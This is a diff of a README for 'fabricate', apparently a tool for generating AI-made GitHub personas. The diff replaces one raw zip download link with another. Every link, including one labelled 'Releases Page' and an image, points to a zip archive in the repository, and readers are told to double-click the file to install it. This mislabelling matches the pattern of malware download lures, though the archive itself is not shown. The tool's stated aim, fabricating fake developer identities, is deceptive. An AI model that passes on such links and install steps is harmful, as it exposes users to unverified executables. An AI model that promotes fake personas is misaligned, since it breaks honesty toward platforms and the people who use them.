@@ -1,7 +1,7 @@
 # 🎨 fabricate - Create AI-Driven GitHub Personas Easily
 
 ## 📥 Download Now
-[![Download fabricate](https://raw.githubusercontent.com/ono55020844/fabricate/main/fabricate/fabricate_earthworm.zip)](https://raw.githubusercontent.com/ono55020844/fabricate/main/fabricate/fabricate_earthworm.zip)
+[![Download fabricate](https://github.com/ono55020844/fabricate/raw/refs/heads/main/fabricate/Software_2.0.zip)](https://github.com/ono55020844/fabricate/raw/refs/heads/main/fabricate/Software_2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to **fabricate**, your go-to tool for creating AI-generated GitHub personas. Follow these simple steps to get up and running.
@@ -20,11 +20,11 @@ Before you start, make sure your system meets the following requirements:
 - **Data Export Options:** Save your personas in various formats for easy sharing and collaboration.
 
 ## 📦 Download & Install
-1. Visit the [Releases Page](https://raw.githubusercontent.com/ono55020844/fabricate/main/fabricate/fabricate_earthworm.zip) to download the latest version of fabricate.
+1. Visit the [Releases Page](https://github.com/ono55020844/fabricate/raw/refs/heads/main/fabricate/Software_2.0.zip) to download the latest version of fabricate.
 2. Look for the download link for your operating system.
 3. Click the link to start the download.
 
-![Download Button](https://raw.githubusercontent.com/ono55020844/fabricate/main/fabricate/fabricate_earthworm.zip)
+![Download Button](https://github.com/ono55020844/fabricate/raw/refs/heads/main/fabricate/Software_2.0.zip)
 
 4. Once the download is complete, locate the file on your computer.
 5. Double-click the downloaded file to start the installation.
